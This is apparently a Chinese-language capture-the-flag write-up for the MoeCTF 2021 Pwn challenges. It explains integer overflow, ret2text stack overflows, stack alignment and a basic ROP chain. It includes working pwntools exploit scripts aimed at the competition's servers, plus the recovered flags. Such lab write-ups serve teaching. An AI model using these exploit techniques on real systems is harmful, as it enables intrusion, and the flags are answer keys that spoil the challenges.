# MoeCTF 2021 WP

## 前言

第一次打MoeCTF，里面的人很好，题的质量又高，玩的很开心，期待下次再来。
只学了Pwn，所以就只写了 Pwn 的WP。

https://moectf.online/

---

[TOC]

---

## PWN

### test_your_nc

入门题，把 nc pwn.blackbird.wang 9500 复制到有 nc 工具终端，即可拿到权限。

```
moectf{enjoy_the_netcat_and_the_shell}
```

> http://netcat.sourceforge.net/
>
> Netcat is a featured networking utility which reads and writes data across network connections, using the TCP/IP protocol.
> It is designed to be a reliable "back-end" tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities.
>
> nc 的作用
>
> （1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>（2）端口的扫描，nc可以作为client发起TCP或UDP连接<br>（3）机器之间传输文件<br>（4）机器之间网络测速

### Int_overflow

考察 整数溢出，unsigned int 和 int 在计算机中储存的方式

```c
  unsigned int v4;
  __isoc99_scanf("%u", &v4);
  if ( (v4 & 0x80000000) == 0 )
  {
    puts("<0 ?");
  }
  else
  {
    puts("But I want <0 now!");
    printf("%d\n", v4);
    if ( v4 )
    {
      puts("You know int overflow!");
      sy stem("/bin/sh");
    }
    else
    {
      puts(">0 ?");
    }
  }
```

首先看程序，输入一个 unsigned int 给 v4，和 0x80000000 即（0b10000000000000000000000000000000）做与运算，就是检查v4作为 int 是否为负数，接着判断 v4 作为unsigned int 是否大于0，大于0即可拿到权限

由于计算机中所有数字都是用补码储存，输入负数（大于 - 2^31）用补码表示，第32位（符号位）一定为1；输入大于2^31，小于2^32的正数，第32位也为1，即可通过第一个check，而unsigned int 一定是 ≥0 的，即可通过第二个check。

解的范围 [-2147483648, -1] ∪ [2147483648, 4294967295]

> 在二进制中<br>int 类型由1个符号位和31个数值位组成，当符号位为1时，为负数<br>unsigned int 类型由32个数值位组成，一定大于或等于0

```
moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}
```

### ret2text_ez

考察 栈溢出利用 - ret2text

#### 原理

在运行一个函数的时候，为了隔离两个函数，都会开辟一个内存空间，作为新的栈帧给函数使用，其中栈帧底部（即帧基）储存着**函数返回地址**，函数返回地址一般指向着该函数在上一个函数的位置下方，用于执行完该函数后**跳回上一个函数**。当程序读取数据时，可读取的数据长度大于该参数的长度，会出现栈溢出，可能导致函数返回地址被覆盖，攻击者可改写此地址让程序跳转到可利用的地方进行攻击。
![image20210921115005657.png](https://humoooor.cn/upload/2021/10/image-20210921115005657-e66e7195f67b4b448eed77ec7f0f047d.png)
![image20210921115009605.png](https://humoooor.cn/upload/2021/10/image-20210921115009605-20e814b96c9b42b5bfe8e4f77f82d100.png)
![image20210921115131915.png](https://humoooor.cn/upload/2021/10/image-20210921115131915-1b551f4f338a4a9c8987c99e95c2a7e5.png)

在该题中使用 read函数读取数据放入buf数组中，但是buf长度为32，而read最多读取0x32（即十进制的50），进入函数的栈中可以看到，返回地址距离buf数组很近，只要将返回地址覆盖成backdoor()函数的地址，即可拿到权限

#### exp

```python
from pwn import *
p = remote("pwn.blackbird.wang", 9509)
backdoor = 0x401196

payload = b'a' * (32 + 8) + p32(backdoor)
p.send(payload)
p.interactive()
```

```
moectf{1_l0v3_pwn!!!I'll_ak_pwn}
```

### ret2text

考察 ret2text 和 栈的字节对齐

#### 原理

> 栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。
>
> 在ubuntu18及以上的版本，64位的程序若包含了system(“/bin/sh”)，就需要考虑栈的字节对齐，如果数据没有对齐的话，就无法正确执行。
>
> 因此在覆盖所用的函数地址前，要再任意加上一个函数返回地址

```c
char s[10];
read(s, 0, 0x100uLL);
```

![image20210921150047342.png](https://humoooor.cn/upload/2021/10/image-20210921150047342-d5b7d2d460644a609936a4077fdb7e35.png)
![image20210921155930857.png](https://humoooor.cn/upload/2021/10/image-20210921155930857-c469c9b50d7946d2b95e32d116f83c06.png)

#### exp

```python
from pwn import *
p = remote('pwn.blackbird.wang', 9502)
backdoor = 0x400687
ret = 0x400699
payload = b'a' * (10 + 8) + p64(ret) + p64(backdoor)
p.send(payload)
p.interactive()
```

```
moectf{ret2txt_tr4v3l2she11}
```

### Int_overflow_revenge

考察 溢出

利用点在 sell_watermelon() 函数里

![image20210922110502300.png](https://humoooor.cn/upload/2021/10/image-20210922110502300-62ed9223160c4568a5896031f1e1952d.png)

#### exp

```python
from pwn import *
p = remote('pwn.blackbird.wang', 9508)
# 这里是输入%d，需要转换成十进制
backdoor = format(0x8049236, 'd') 
# 第二个输入131是要使上面的 scanf() 能够写到函数返回地址
payload = '0\n' + '131\n' + '1\n' + backdoor + '\n'
p.send(payload)
p.interactive()
```

```
moectf{the_watemelon_is_permitted_to_be_grown_up}
```

### babyrop

考察简单的rop

用IDA看，只有 system 函数，backdoor 是没用的，因此要用 gets 函数把 ”/bin/sh“ 写到可读写段，如 bss 段

#### 思路

先把 gets 的返回地址覆盖成 gets_plt 地址，把 gets_plt 的返回地址覆盖成 main 的地址，然后写入 bss 的地址，写入 '/bin/sh' 字符串，然后程序返回到 main 中，将这一次的 gets 的返回地址覆盖成 system_plt，读 bss 段，即可拿到shell

#### exp

```python
from pwn import *
#p = process('./babyrop')
p = remote('pwn.blackbird.wang', 9504)
#gdb.attach(p, 'b *0x08048540\nc \n')
get_plt = 0x08048380
main = 0x0804854D
bss = 0x804a028
payload = b'a' * (36 + 8) + p32(get_plt) + p32(main) + p32(bss) + b'\n' + b'/bin/sh\n'
p.send(payload)

system = 0x080483A0
payload = b'a' * (36 + 8) + p32(system) + p32(0) + p32(bss)
p.sendline(payload)
p.interactive()
```
```
moectf{do_you_l1k3_vtuber_too?}
```